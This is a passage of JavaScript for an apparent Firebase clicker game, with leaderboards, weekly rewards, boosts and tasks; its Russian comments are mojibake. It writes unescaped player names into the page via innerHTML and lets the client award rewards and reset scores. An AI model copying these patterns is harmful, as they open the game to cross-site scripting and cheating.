  const leaderboardBody = document.getElementById("leaderboardBody");
  const overallBtn = document.getElementById("overallTabBtn");
  const weeklyBtn = document.getElementById("weeklyTabBtn");

  currentTab = tab; // –û–±–Ω–æ–≤–ª—è–µ–º —Ç–µ–∫—É—â—É—é –≤–∫–ª–∞–¥–∫—É

  
  if (tab === "overall") {
    overallBtn.classList.add("active");
    weeklyBtn.classList.remove("active");
    tableHeader.innerHTML = "<tr><th>#</th><th>Player</th><th>Tokens</th></tr>";
    // –î–∞–Ω–Ω—ã–µ –±—É–¥—É—Ç –∑–∞–≥—Ä—É–∂–µ–Ω—ã —Å–ª—É—à–∞—Ç–µ–ª–µ–º
  } else {
    overallBtn.classList.remove("active");
    weeklyBtn.classList.add("active");
    tableHeader.innerHTML = "<tr><th>#</th><th>Player</th><th>Tokens</th><th>Reward</th></tr>";
    // –î–∞–Ω–Ω—ã–µ –±—É–¥—É—Ç –∑–∞–≥—Ä—É–∂–µ–Ω—ã —Å–ª—É—à–∞—Ç–µ–ª–µ–º
  }
}

    

//—Ç–∞–±–ª–∏—Ü–∞ –ª–∏–¥–µ—Ä–æ–≤ 
function updateOverallLeaderboard() {
  const leaderboardBody = document.getElementById("leaderboardBody");
  db.ref("leaderboard").once("value", snapshot => {
    const data = [];
    snapshot.forEach(child => {
      const entry = child.val();
      if (entry && entry.score !== undefined && entry.name) {
        data.push({
          id: entry.id,
          name: entry.name,
          score: entry.score
        });
      }
    });

    data.sort((a, b) => b.score - a.score);

    leaderboardBody.innerHTML = "";

    if (data.length === 0) {
      leaderboardBody.innerHTML = "<tr><td colspan='3'>No players yet</td></tr>";
      return;
    }

    data.slice(0, 10).forEach((entry, index) => {
      leaderboardBody.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td></tr>`;
    });
  }, error => {
    console.error("Error loading leaderboard:", error);
    showMessage("Failed to load leaderboard.");
  });
}

//—Ç–∞–±–ª–∏—Ü–∞ –ª–∏–¥–µ—Ä–æ–≤ 
function updateWeeklyLeaderboard() {
  const weekKey = getWeekKey();
  const leaderboardBody = document.getElementById("leaderboardBody");
  db.ref(`weeklyLeaderboard/${weekKey}`).once("value", snapshot => {
    const data = [];
    snapshot.forEach(child => {
      const entry = child.val();
      if (entry && entry.score >= 50000 && entry.name) {
        data.push({
          id: entry.id,
          name: entry.name,
          score: entry.score,
          rewardClaimed: entry.rewardClaimed || false
        });
      }
    });

    data.sort((a, b) => b.score - a.score);

    leaderboardBody.innerHTML = "";

    if (data.length === 0) {
      leaderboardBody.innerHTML = "<tr><td colspan='4'>No players with 50,000+ tokens this week</td></tr>";
      return;
    }

    data.slice(0, 10).forEach((entry, index) => {
      const reward = getRewardForRank(index + 1);
      const rewardText = entry.rewardClaimed ? `${reward} (Claimed)` : reward;
      leaderboardBody.innerHTML += `<tr><td>${index + 1}</td><td>${entry.name}</td><td>${entry.score}</td><td>${rewardText}</td></tr>`;
    });
  }, error => {
    console.error("Error loading weekly leaderboard:", error);
    showMessage("Failed to load weekly leaderboard.");
  });
}

//—Ç–∞–±–ª–∏—Ü–∞ –ª–∏–¥–µ—Ä–æ–≤ 
    function getWeekKey() {
  const now = new Date();
  const year = now.getFullYear();
  const week = getWeekNumber();
  return `${year}_${week}`;
    }

 //—Ç–∞–±–ª–∏—Ü–∞ –ª–∏–¥–µ—Ä–æ–≤  
function getRewardForRank(rank) {
  if (rank <= 3) return 10000;
  if (rank <= 5) return 7000;
  return 5000;
}

      
//—Ç–∞–±–ª–∏—Ü–∞ –ª–∏–¥–µ—Ä–æ–≤ 
   function updateWeeklyScore() {
  if (!user) return;
  const weekKey = getWeekKey();
  const userName = user.displayName || `Player_${user.uid.slice(0, 8)}`;
  db.ref(`weeklyLeaderboard/${weekKey}/${user.uid}`).update({
    id: user.uid,
    name: userName,
    score: score,
    lastUpdate: Date.now()
  }).catch(error => {
    console.error("Error updating weekly score:", error);
  });
} 
//—Ç–∞–±–ª–∏—Ü–∞ –ª–∏–¥–µ—Ä–æ–≤ 
function awardWeeklyRewards() {
  const weekKey = getWeekKey();
  db.ref(`weeklyLeaderboard/${weekKey}`).once("value", snapshot => {
    const data = [];
    snapshot.forEach(child => {
      const entry = child.val();
      if (entry && entry.score >= 50000 && !entry.rewardClaimed) {
        data.push({
          id: entry.id,
          score: entry.score
        });
      }
    });

    data.sort((a, b) => b.score - a.score);

    data.slice(0, 10).forEach((entry, index) => {
      const reward = getRewardForRank(index + 1);
      db.ref(`leaderboard/${entry.id}/score`).transaction(currentScore => {
        return (currentScore || 0) + reward;
      }).then(() => {
        db.ref(`weeklyLeaderboard/${weekKey}/${entry.id}`).update({
          rewardClaimed: true,
          lastUpdate: Date.now()
        });
        if (entry.id === user?.uid) {
          score += reward;
          updateCounterDisplay();
          showMessage(`Weekly reward: +${reward} tokens for rank ${index + 1}!`);
        }
        db.ref(`notifications/${entry.id}`).push({
          message: `Weekly reward: +${reward} tokens for rank ${index + 1}!`,
          timestamp: Date.now(),
          read: false
        });
      }).catch(error => {
        console.error("Error awarding weekly reward:", error);
      });
    });
  });
}

//—Ç–∞–±–ª–∏—Ü–∞ –ª–∏–¥–µ—Ä–æ–≤ 
   function checkWeeklyReset() {
  const now = new Date();
  const weekKey = getWeekKey();
  db.ref(`weeklyLeaderboard/lastReset`).once("value").then(snapshot => {
    const lastReset = snapshot.val() || 0;
    const oneWeek = 7 * 24 * 60 * 60 * 1000; // 7 –¥–Ω–µ–π –≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥–∞—Ö
    if (Date.now() - lastReset >= oneWeek) {
      // –ù–∞—á–∏—Å–ª—è–µ–º –Ω–∞–≥—Ä–∞–¥—ã –∑–∞ –ø—Ä–æ—à–ª—É—é –Ω–µ–¥–µ–ª—é
      awardWeeklyRewards();
      // –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Ç–∞–±–ª–∏—Ü—É
      db.ref(`weeklyLeaderboard/${weekKey}`).remove();
      db.ref(`weeklyLeaderboard/lastReset`).set(Date.now());

      listenToWeeklyLeaderboard();
    }
  });
} 


    function closeAllPanels() {
      console.log("Closing all panels...");
      const shop = document.getElementById("shop");
      if (shop) {
        shop.style.display = "none";
        console.log("Shop panel closed");
      } else {
        console.error("Element #shop not found");
      }

      const achievementsPanel = document.getElementById("achievementsPanel");
      if (achievementsPanel) {
        achievementsPanel.classList.remove("open");
        console.log("Achievements panel closed");
      } else {
        console.error("Element #achievementsPanel not found");
      }
      const achievementsBtn = document.querySelector("button[onclick='toggleAchievements()']");
      if (achievementsBtn) {
        achievementsBtn.innerHTML = "üèÜ Achievements ‚ñº";
        console.log("Achievements button text updated");
      } else {
        console.error("Button for toggleAchievements not found");
      }

      const tasksPanel = document.getElementById("tasksPanel");
      if (tasksPanel) {
        tasksPanel.classList.remove("open");
        console.log("Tasks panel closed");
      } else {
        console.error("Element #tasksPanel not found");
      }
      const tasksBtn = document.querySelector("button[onclick='toggleTasks()']");
      if (tasksBtn) {
        tasksBtn.innerHTML = "üìã Tasks ‚ñº";
        console.log("Tasks button text updated");
      } else {
        console.error("Button for toggleTasks not found");
      }
    }

    function setClickPower(newPower) {
      clickPower = Math.min(newPower, 8);
      updateClickPowerBar();
      updateProfilePanel();
    }

    function getClickPowerUpgradeCost() {
      return Math.floor(500 * Math.pow(6, clickPower - 1));
    }

    function updateClickPowerCostText() {
      const costText = document.getElementById('clickPowerCostText');
      const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
      const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");

      if (costText) {
        if (clickPower >= 8) {
          costText.textContent = "üí™ Click Power: MAX LEVEL";
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = "Maximum Click Power reached";
          }
        } else if (clickPower >= 3 && currentLevel < clickPower + 1) {
          const cost = getClickPowerUpgradeCost();
          costText.textContent = `üí™ Click Power +1 (Cost: ${cost})`;
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = `Reach player level ${clickPower + 1} to upgrade`;
          }
        } else {
          const cost = getClickPowerUpgradeCost();
          costText.textContent = `üí™ Click Power +1 (Cost: ${cost})`;
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = "";
          }
        }
      }
    }

  /*!   function boostClickPowerTemporarily(amount, duration) {
      if (tempBoostTimeout) clearTimeout(tempBoostTimeout);

      originalClickPower = clickPower;
      const boosted = Math.min(clickPower + amount, 8);
      clickPower = boosted;

      const actualBoost = boosted - originalClickPower;
      showMessage(`Temporary boost: Click Power +${actualBoost} –Ω–∞ ${duration / 1000} —Å–µ–∫`);

      // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
      if (user) {
        const boostEndTime = Date.now() + duration;
        db.ref("leaderboard/" + user.uid).update({
          tempBoostActive: true,
          tempBoostEndTime: boostEndTime,
          tempBoostOriginalClickPower: originalClickPower,
          tempBoostAmount: amount,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
        });
      }

      tempBoostTimeout = setTimeout(() => {
        clickPower = originalClickPower;
        showMessage(`–ë—É—Å—Ç –∑–∞–∫–æ–Ω—á–∏–ª—Å—è: –°–∏–ª–∞ –∫–ª–∏–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞`);
        updateClickPowerBar();
        updateProfilePanel();
        submitScore();

        // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
        if (user) {
          db.ref("leaderboard/" + user.uid).update({
            tempBoostActive: false,
            tempBoostEndTime: 0,
            tempBoostOriginalClickPower: 0,
            tempBoostAmount: 0,
            lastUpdate: Date.now()
          }).catch(error => {
            console.error("–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
          });
        }
      }, duration);
    }!*/


    function boostClickPowerTemporarily(amount, duration) {
  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∞–∫—Ç–∏–≤–µ–Ω –ª–∏ –±—É—Å—Ç
  if (tempBoostTimeout && Date.now() < (autoclickEndTime || 0)) {
    showMessage("–ë—É—Å—Ç —É–∂–µ –∞–∫—Ç–∏–≤–µ–Ω!");
    return; // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –Ω–æ–≤—ã–π –≤—ã–∑–æ–≤, –µ—Å–ª–∏ –±—É—Å—Ç –∞–∫—Ç–∏–≤–µ–Ω
  }

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏—Å—Ö–æ–¥–Ω—É—é —Å–∏–ª—É –∫–ª–∏–∫–∞
  originalClickPower = clickPower;
  const boosted = Math.min(clickPower + amount, 8);
  clickPower = boosted;

  const actualBoost = boosted - originalClickPower;
  showMessage(`–í—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç: –°–∏–ª–∞ –∫–ª–∏–∫–∞ +${actualBoost} –Ω–∞ ${duration / 1000} —Å–µ–∫`);

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
  if (user) {
    const boostEndTime = Date.now() + duration;
    db.ref("leaderboard/" + user.uid).update({
      tempBoostActive: true,
      tempBoostEndTime: boostEndTime,
      tempBoostOriginalClickPower: originalClickPower,
      tempBoostAmount: amount,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
    });
  }

  // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –æ–∫–æ–Ω—á–∞–Ω–∏—è –±—É—Å—Ç–∞
  if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
  tempBoostTimeout = setTimeout(() => {
    clickPower = originalClickPower;
    showMessage(`–ë—É—Å—Ç –∑–∞–∫–æ–Ω—á–∏–ª—Å—è: –°–∏–ª–∞ –∫–ª–∏–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞`);
    updateClickPowerBar();
    updateProfilePanel();
    submitScore();

    // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        tempBoostActive: false,
        tempBoostEndTime: 0,
        tempBoostOriginalClickPower: 0,
        tempBoostAmount: 0,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
      });
    }
    tempBoostTimeout = null;
  }, duration);
}


  /*!!!  function boostClickPowerTemporarily(amount, duration) {
  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∞–∫—Ç–∏–≤–µ–Ω –ª–∏ –±—É—Å—Ç
  if (tempBoostTimeout && Date.now() < (tempBoostEndTime || 0)) {
    showMessage("–ë—É—Å—Ç —É–∂–µ –∞–∫—Ç–∏–≤–µ–Ω!");
    return;
  }

  originalClickPower = clickPower;
  const boosted = Math.min(clickPower + amount, 8);
  clickPower = boosted;

  const actualBoost = boosted - originalClickPower;
  showMessage(`–í—Ä–µ–º–µ–Ω–Ω—ã–π –±—É—Å—Ç: –°–∏–ª–∞ –∫–ª–∏–∫–∞ +${actualBoost} –Ω–∞ ${duration / 1000} —Å–µ–∫`);

  if (user) {
    tempBoostEndTime = Date.now() + duration; // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤—Ä–µ–º—è –æ–∫–æ–Ω—á–∞–Ω–∏—è –±—É—Å—Ç–∞
    db.ref("leaderboard/" + user.uid).update({
      tempBoostActive: true,
      tempBoostEndTime: tempBoostEndTime,
      tempBoostOriginalClickPower: originalClickPower,
      tempBoostAmount: amount,
      clickPower: clickPower, // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–µ–∫—É—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ clickPower
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
    });
  }

  if (tempBoostTimeout) clearTimeout(tempBoostTimeout);
  tempBoostTimeout = setTimeout(() => {
    clickPower = originalClickPower;
    showMessage(`–ë—É—Å—Ç –∑–∞–∫–æ–Ω—á–∏–ª—Å—è: –°–∏–ª–∞ –∫–ª–∏–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞`);
    updateClickPowerBar();
    updateProfilePanel();
    submitScore();

    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        tempBoostActive: false,
        tempBoostEndTime: 0,
        tempBoostOriginalClickPower: 0,
        tempBoostAmount: 0,
        clickPower: clickPower, // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ clickPower
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
      });
    }
    tempBoostTimeout = null;
    tempBoostEndTime = 0;
  }, duration);
}!!!*/


    function toggleAchievements() {
      console.log("Calling toggleAchievements...");
      const panel = document.getElementById("achievementsPanel");
      if (!panel) {
        console.error("Element #achievementsPanel not found in toggleAchievements");
        return;
      }
      const btn = document.querySelector("button[onclick='toggleAchievements()']");
      if (!btn) {
        console.error("Button for toggleAchievements not found");
        return;
      }
      const isCurrentlyOpen = panel.classList.contains("open");
      console.log("Achievements panel is currently open:", isCurrentlyOpen);

      if (isCurrentlyOpen) {
        panel.classList.remove("open");
        btn.innerHTML = "üèÜ Achievements ‚ñº";
        console.log("Closing achievements panel");
      } else {
        closeAllPanels();
        panel.classList.add("open");
        btn.innerHTML = "üèÜ Achievements ‚ñ≤";
        console.log("Opening achievements panel");
        renderAchievements();
      }
    }

    function renderAchievements() {
      const list = document.getElementById('achievementsList');
      list.innerHTML = '';

      for (const key in allAchievements) {
        const achieved = achievements[key];
        const ach = allAchievements[key];

        const div = document.createElement('div');
        div.style.marginBottom = '10px';
        div.style.padding = '8px';
        div.style.border = '1px solid #00c3ff';
        div.style.borderRadius = '8px';
        div.style.backgroundColor = achieved ? '#00ffa6' : '#222';
        div.style.color = achieved ? '#000' : '#fff';
        div.innerHTML = `<strong>${ach.name}</strong><br>${ach.description}<br><em>${ach.reward}</em>`;
        list.appendChild(div);
      }
    }

    function updateClickPowerBar() {
      document.getElementById("clickPowerDisplay").innerText = clickPower;
      const progress = Math.min((clickPower / 8) * 100, 100);
      document.getElementById("clickPowerBar").style.width = progress + "%";
      updateClickPowerCostText();
    }

    function updateCounterDisplay() {
      document.getElementById("counter").innerText = `Tokens: ${score}`;
    }

    function showMessage(msg) {
      const el = document.getElementById("message");
      el.innerText = msg;
      setTimeout(() => el.innerText = '', 3000);
    }

function getWeekNumber() {
  const now = new Date();
  const startOfYear = new Date(now.getFullYear(), 0, 1);
  const pastDaysOfYear = (now - startOfYear) / 86400000;
  return Math.ceil((pastDaysOfYear + startOfYear.getDay() + 1) / 7);
} 


/*??????function renderTasks() {
  if (isRenderingTasks) return;
  isRenderingTasks = true;

  const list = document.getElementById("tasksList");
  list.innerHTML = "";

  if (!user) {
    isRenderingTasks = false;
    return;
  }

  db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
    const tasksData = snapshot.val() || {};
    const today = new Date().toDateString();
    const startOfWeek = new Date(new Date().setDate(new Date().getDate() - new Date().getDay() + (new Date().getDay() === 0 ? -6 : 1))).toDateString();
    const weekNumber = getWeekNumber();
    const isEvenWeek = weekNumber % 2 === 0;

    const activeTasks = dailyTasks.filter(task => {
      if (!task.alternate) return true;
      if (task.id === "autoclickerMaster" && isEvenWeek) return true;
      if (task.id === "collectBigTokens" && !isEvenWeek) return true;
      return false;
    });

    activeTasks.forEach(task => {
      let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

      const resetKey = task.period === "weekly" ? startOfWeek : today;
      if (taskData.lastReset !== resetKey) {
        taskData = { 
          progress: 0, 
          lastReset: resetKey, 
          completions: 0, 
          completed: false,
          ...(task.goalOptions && {
            goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
            reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
          })
        };
        db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
      }

      const div = document.createElement("div");
      if (taskData.completed || taskData.completions >= 1) {
        div.innerHTML = `${task.description}: Completed for ${task.period === "weekly" ? "this week" : "today"}!`;
      } else {
        if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${taskData.goal} (Reward: ${taskData.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else if (task.id === "subscribeTwitter") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <a href="${task.link}" target="_blank" rel="noopener noreferrer" style="color: #00ffa6; text-decoration: none; cursor: pointer;" onclick="openTwitterLink('${task.link}'); return false;">Go to X</a>
            <button class="click-button" onclick="completeTwitterTask('${task.id}')" style="margin-left: 10px;">Claim</button>
          `;
        } else if (task.id === "clickMasterWeekly") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < task.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else if (task.id === "miniGameChallenge") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} üíé)
          `;
        } else {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} ${task.rewardType === "crystals" ? "üíé" : "tokens"})
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        }
      }
      list.appendChild(div);
    });

    const validTaskIds = activeTasks.map(task => task.id);
    for (const taskId in tasksData) {
      if (!validTaskIds.includes(taskId)) {
        db.ref(`tasks/${user.uid}/${taskId}`).remove();
      }
    }

    isRenderingTasks = false;
  }).catch(error => {
    console.error("Error rendering tasks:", error);
    showMessage("Failed to load tasks.");
    isRenderingTasks = false;
  });
}????*/

function renderTasks() {
  if (isRenderingTasks) return;
  isRenderingTasks = true;

  const list = document.getElementById("tasksList");
  list.innerHTML = "";

  if (!user) {
    isRenderingTasks = false;
    return;
  }

  db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
    const tasksData = snapshot.val() || {};
    const today = new Date().toDateString();
    const startOfWeek = new Date(new Date().setDate(new Date().getDate() - new Date().getDay() + (new Date().getDay() === 0 ? -6 : 1))).toDateString();
    const weekNumber = getWeekNumber();
    const isEvenWeek = weekNumber % 2 === 0;

    const activeTasks = dailyTasks.filter(task => {
      if (!task.alternate) return true;
      if (task.id === "autoclickerMaster" && isEvenWeek) return true;
      if (task.id === "collectBigTokens" && !isEvenWeek) return true;
      return false;
    });

    activeTasks.forEach(task => {
      let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

      const resetKey = task.period === "weekly" ? startOfWeek : today;
      if (taskData.lastReset !== resetKey) {
        taskData = { 
          progress: 0, 
          lastReset: resetKey, 
          completions: 0, 
          completed: false,
          ...(task.goalOptions && {
            goal: task.goalOptions[Math.floor(Math.random() * task.goalOptions.length)],
            reward: task.rewards[Math.floor(Math.random() * task.rewards.length)]
          })
        };
        db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
      }

      const div = document.createElement("div");
      if (taskData.completed || taskData.completions >= 1) {
        div.innerHTML = `${task.description}: Completed for ${task.period === "weekly" ? "this week" : "today"}!`;
      } else {
        if (task.id === "collectTokens" || task.id === "collectBigTokens") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${taskData.goal} (Reward: ${taskData.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else if (task.id === "subscribeTwitter") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <a href="${task.link}" target="_blank" rel="noopener noreferrer" style="color: #00ffa6; text-decoration: none; cursor: pointer;" onclick="openTwitterLink('${task.link}'); return false;">Go to X</a>
            <button class="click-button" onclick="completeTwitterTask('${task.id}')" style="margin-left: 10px;">Claim</button>
          `;
        } else if (task.id === "clickMasterWeekly") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} tokens)
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        } else if (task.id === "miniGameChallenge") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} üíé)
          `;
        } else if (task.id === "autoclickerMaster") {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward})
          `;
        } else {
          div.innerHTML = `
            ${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward} ${task.rewardType === "crystals" ? "üíé" : "tokens"})
            <br>
            <button class="click-button" onclick="claimTask('${task.id}')" ${taskData.progress < taskData.goal ? 'disabled' : ''}>Claim</button>
          `;
        }
      }
      list.appendChild(div);
    });

    const validTaskIds = activeTasks.map(task => task.id);
    for (const taskId in tasksData) {
      if (!validTaskIds.includes(taskId)) {
        db.ref(`tasks/${user.uid}/${taskId}`).remove();
      }
    }

    isRenderingTasks = false;
  }).catch(error => {
    console.error("Error rendering tasks:", error);
    showMessage("Failed to load tasks.");
    isRenderingTasks = false;
  });
}
  

    
    

/*!function claimTask(taskId) {
  if (!user) {
    showMessage("Please sign in to complete tasks.");
    return;
  }

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || taskData.completions >= 1)) {
      showMessage("Task already completed for this period!");
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      let reward = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.reward : task.reward;

      score += reward;
      showMessage(`Task "${task.description}" completed! +${reward} tokens`);
      updateCounterDisplay();
      submitScore();

      db.ref(`tasks/${user.uid}/${task.id}`).set({
        progress: taskData.progress,
        lastReset: taskData.lastReset,
        completions: completions,
        completed: true,
        ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
      }).then(() => {
        renderTasks();
      }).catch(error => {
        console.error("Error completing task:", error);
        showMessage("Failed to complete task.");
      });
    } else {
      showMessage("Task not yet completed!");
    }
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
}!*/

  /*!?  function claimTask(taskId) {
  if (!user) {
    showMessage("Please sign in to complete tasks.");
    return;
  }

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || taskData.completions >= 1)) {
      showMessage("Task already completed for this period!");
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      let reward = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.reward : task.reward;

      if (task.rewardType === "crystals") {
        crystals += reward;
        showMessage(`Task "${task.description}" completed! +${reward} üíé`);
        updateProfilePanel(); // Update to show new crystal count
      } else {
        score += reward;
        showMessage(`Task "${task.description}" completed! +${reward} tokens`);
      }

      updateCounterDisplay();
      submitScore();

      db.ref(`tasks/${user.uid}/${task.id}`).set({
        progress: taskData.progress,
        lastReset: taskData.lastReset,
        completions: completions,
        completed: true,
        ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
      }).then(() => {
        renderTasks();
      }).catch(error => {
        console.error("Error completing task:", error);
        showMessage("Failed to complete task.");
      });
    } else {
      showMessage("Task not yet completed!");
    }
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
}!?*/
    

function claimTask(taskId) {
  if (!user) {
    showMessage("Please sign in to complete tasks.");
    return;
  }

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (!task || !taskData) {
      showMessage("Task not found!");
      return;
    }

    if (taskData.completed || taskData.completions >= 1) {
      showMessage("Task already completed for this period!");
      return;
    }

    const goal = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.goal : task.goal;
    if (taskData.progress >= goal) {
      const completions = (taskData.completions || 0) + 1;
      let reward = task.id === "collectTokens" || task.id === "collectBigTokens" ? taskData.reward : task.reward;

      if (task.id === "miniGameChallenge") { // –Ø–≤–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–ª—è miniGameChallenge
        crystals = (crystals || 0) + reward;
        showMessage(`Task "${task.description}" completed! +${reward} üíé`);
        updateProfilePanel();
      } else if (task.rewardType === "crystals") {
        crystals = (crystals || 0) + reward;
        showMessage(`Task "${task.description}" completed! +${reward} üíé`);
        updateProfilePanel();
      } else {
        score += reward;
        showMessage(`Task "${task.description}" completed! +${reward} tokens`);
      }

      updateCounterDisplay();
      submitScore();

      db.ref(`tasks/${user.uid}/${task.id}`).set({
        progress: taskData.progress,
        lastReset: taskData.lastReset,
        completions: completions,
        completed: true,
        ...(task.id === "collectTokens" || task.id === "collectBigTokens" ? { goal: taskData.goal, reward: taskData.reward } : {})
      }).then(() => {
        renderTasks();
      }).catch(error => {
        console.error("Error completing task:", error);
        showMessage("Failed to complete task.");
      });
    } else {
      showMessage("Task not yet completed!");
    }
  }).catch(error => {
    console.error("Error fetching task data:", error);
    showMessage("Failed to fetch task data.");
  });
}

    
function completeTwitterTask(taskId) {
  if (!user) {
    showMessage("Please sign in to complete tasks.");
    return;
  }

  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || taskData.completions >= 1)) {
      showMessage("Task already completed for today!");
      return;
    }

